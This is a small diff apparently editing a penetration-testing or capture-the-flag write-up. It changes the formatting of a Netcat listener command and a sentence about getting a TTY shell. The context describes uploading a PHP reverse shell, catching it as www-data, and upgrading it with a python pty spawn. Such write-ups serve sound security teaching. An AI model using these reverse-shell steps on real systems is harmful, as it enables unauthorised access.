@@ -232,7 +232,7 @@ It ran the command. So I proceed by uploading a PHP reverse shell script after r
 Now I started a listener on my host with Netcat.
 
 ```
-$ nc -v -n -l -p 1234
+$ nc -lnvp 1234
 ```
 
 And then I got the PHP reverse shell to connect back.
@@ -245,7 +245,7 @@ I got in with the privilege of user www-data.
 
 ### Reverse Shell
 
-First, I tried to get my hand on a tty shell.
+First, I tried to get my hand on a TTY shell.
 
 ```
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
